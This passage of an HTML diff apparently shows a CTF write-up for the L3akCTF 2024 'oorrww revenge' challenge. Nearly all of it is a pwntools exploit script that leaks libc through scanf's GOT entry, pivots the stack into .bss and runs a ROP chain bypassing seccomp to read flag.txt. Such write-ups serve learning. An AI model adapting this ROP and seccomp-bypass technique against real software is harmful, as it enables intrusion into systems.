+</span></span><span class="line"><span class="ln"> 33</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 34</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 35</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 36</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 37</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 38</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 39</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 40</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 41</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 42</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 43</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 44</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 45</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 46</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 47</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 48</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 49</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 50</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># canary</span>
+</span></span><span class="line"><span class="ln"> 51</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># rbp</span>
+</span></span><span class="line"><span class="ln"> 52</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RAX_RET</span><span class="p">),</span> <span class="c1"># ret</span>
+</span></span><span class="line"><span class="ln"> 53</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;__isoc99_scanf&#34;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="ln"> 54</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">MOV_EDI_EAX_PUTS</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln"> 55</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># pop rbp from previous gadget</span>
+</span></span><span class="line"><span class="ln"> 56</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">RET</span><span class="p">),</span> <span class="c1"># align the stack to 16 bytes</span>
+</span></span><span class="line"><span class="ln"> 57</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="ln"> 58</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln"> 59</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln"> 60</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="ln"> 62</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+</span></span><span class="line"><span class="ln"> 64</span><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 65</span><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln"> 66</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 67</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 68</span><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">][::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln"> 69</span><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln"> 70</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Leak __isoc99_scanf @ &#34;</span><span class="o">+</span><span class="n">leak</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 71</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 72</span><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;__isoc99_scanf&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln"> 73</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] LIBC base @ &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln"> 74</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 75</span><span class="cl"><span class="c1"># ===============================================[ libc.so.6 Gadgets ]============================================</span>
+</span></span><span class="line"><span class="ln"> 76</span><span class="cl"><span class="n">POP_RAX_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x000000000011bec9</span>
+</span></span><span class="line"><span class="ln"> 77</span><span class="cl"><span class="n">POP_RDI_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00000000001741a2</span>
+</span></span><span class="line"><span class="ln"> 78</span><span class="cl"><span class="n">POP_RSI_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x0000000000164bbb</span>
+</span></span><span class="line"><span class="ln"> 79</span><span class="cl"><span class="n">POP_RDX_POP_RBX_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x0000000000174e4e</span>
+</span></span><span class="line"><span class="ln"> 80</span><span class="cl"><span class="n">POP_RCX_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x000000000003d1ee</span>
+</span></span><span class="line"><span class="ln"> 81</span><span class="cl"><span class="n">LEAVE_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x000000000004da83</span> 
+</span></span><span class="line"><span class="ln"> 82</span><span class="cl"><span class="n">SYSCALL_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x0000000000091316</span>
+</span></span><span class="line"><span class="ln"> 83</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 84</span><span class="cl"><span class="c1"># =======================================[ Second payload : write in .bss ]=======================================</span>
+</span></span><span class="line"><span class="ln"> 85</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 86</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 87</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 88</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 89</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 90</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 91</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 92</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 93</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 94</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 95</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 96</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 97</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 98</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 99</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">100</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">101</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">102</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">103</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">104</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># canary</span>
+</span></span><span class="line"><span class="ln">105</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">),</span>  <span class="c1"># rbp -&gt; stack pivoting (RSP = 0x404030)</span>
+</span></span><span class="line"><span class="ln">106</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RDI_RET</span><span class="p">),</span> <span class="c1"># ret</span>
+</span></span><span class="line"><span class="ln">107</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">108</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RSI_RET</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">109</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="mh">0x404020</span><span class="p">),</span> <span class="c1"># .bss address</span>
+</span></span><span class="line"><span class="ln">110</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RDX_POP_RBX_RET</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">111</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="mh">0x500</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">112</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="mh">0x500</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">113</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="ln">114</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">LEAVE_RET</span><span class="p">),</span> <span class="c1"># stack pivoting (rsp = rbp -&gt; 0x404030)</span>
+</span></span><span class="line"><span class="ln">115</span><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="ln">116</span><span class="cl">
+</span></span><span class="line"><span class="ln">117</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+</span></span><span class="line"><span class="ln">118</span><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">119</span><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">120</span><span class="cl">
+</span></span><span class="line"><span class="ln">121</span><span class="cl"><span class="c1"># =======================================[ Third payload : seccomp bypass ]=======================================</span>
+</span></span><span class="line"><span class="ln">122</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="c1"># &#34;flag.txt&#34;</span>
+</span></span><span class="line"><span class="ln">123</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="c1"># &#34;\0&#34; for the end of &#34;flag.txt&#34;</span>
+</span></span><span class="line"><span class="ln">124</span><span class="cl">        <span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX_RET</span><span class="p">),</span> <span class="c1"># RAX = 2</span>
+</span></span><span class="line"><span class="ln">125</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">126</span><span class="cl">        <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI_RET</span><span class="p">),</span> <span class="c1"># RDI = buffer -&gt; &amp;&#34;flag.txt\0&#34; </span>
+</span></span><span class="line"><span class="ln">127</span><span class="cl">            <span class="n">p64</span><span class="p">(</span><span class="mh">0x404020</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">128</span><span class="cl">        <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_RET</span><span class="p">),</span> <span class="c1"># RSI = O_RDONLY -&gt; 2</span>
+</span></span><span class="line"><span class="ln">129</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">130</span><span class="cl">        <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL_RET</span><span class="p">),</span> <span class="c1"># open(&#34;flag.txt\0&#34;,O_RDONLY);</span>
+</span></span><span class="line"><span class="ln">131</span><span class="cl">        <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI_RET</span><span class="p">),</span> <span class="c1"># RDI = 1 -&gt; stdout </span>
+</span></span><span class="line"><span class="ln">132</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">133</span><span class="cl">        <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_RET</span><span class="p">),</span> <span class="c1"># RSI = 3 (I assume it is the file descriptor of opened file)</span>
+</span></span><span class="line"><span class="ln">134</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">135</span><span class="cl"><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX_POP_RBX_RET</span><span class="p">),</span> <span class="c1"># RDX = 0 -&gt; offset</span>
+</span></span><span class="line"><span class="ln">136</span><span class="cl">                            <span class="c1"># RBX = 0 (junk)</span>
+</span></span><span class="line"><span class="ln">137</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">138</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">139</span><span class="cl">        <span class="n">p64</span><span class="p">(</span><span class="n">POP_RCX_RET</span><span class="p">),</span> <span class="c1"># RCX = 0x50 </span>
+</span></span><span class="line"><span class="ln">140</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">141</span><span class="cl"><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;sendfile&#34;</span><span class="p">]),</span> <span class="c1"># sendfile(1,3,0,0x50);</span>
+</span></span><span class="line"><span class="ln">142</span><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="ln">143</span><span class="cl">
+</span></span><span class="line"><span class="ln">144</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln">145</span><span class="cl">
+</span></span><span class="line"><span class="ln">146</span><span class="cl"><span class="c1"># =====================================================[ Flag ]===================================================</span>
+</span></span><span class="line"><span class="ln">147</span><span class="cl">
+</span></span><span class="line"><span class="ln">148</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">149</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;[+] FLAG : &#34;</span><span class="o">+</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">))</span></span></span></code></pre></div><h2 id="notes">Notes</h2>
+<blockquote>
+<p>I have no longer access to remote machine because I couldn’t complete the challenge on time.<br>
+This is why I’m doing it locally.</p>
+</blockquote>
+<p><img src="/images/writeups/l3akctf_2024_oorrww_revenge/flag.png" alt="flag"></p>
+<script>
+
+
+</script>
+
+<script>
+var all_codeblocks = document.getElementsByClassName("chroma")
+for(let i=0;i<all_codeblocks.length;i++)
+{
+    all_lines_of_a_codeblock = all_codeblocks[i].getElementsByClassName("line");
+    let start_number = -1;
+    start_number = parseInt(all_lines_of_a_codeblock[0].getElementsByTagName("span")[2].innerHTML,10);
+    all_lines_of_a_codeblock[0].style.display = "none";    
+    for(let line=1;line<all_lines_of_a_codeblock.length;line++)
+    {
+        let diff = String(all_lines_of_a_codeblock.length).length - String(start_number).length;
+        if(diff > 0)
+        {
+            all_lines_of_a_codeblock[line].getElementsByTagName("span")[0].innerHTML = "<span style='visibility:hidden;'>" + "0".repeat(diff) + "</span>" + String(start_number);
+        }
+        else
+        {
+            all_lines_of_a_codeblock[line].getElementsByTagName("span")[0].innerHTML = String(start_number);
+        }
+        start_number = start_number + 1;
+    }
+}
+</script>
+
+</content>
+<p>
+  
+</p>
+
+
+
+
+  </main>
+  <footer></footer>
+
+    
+</body>
+
+</html>
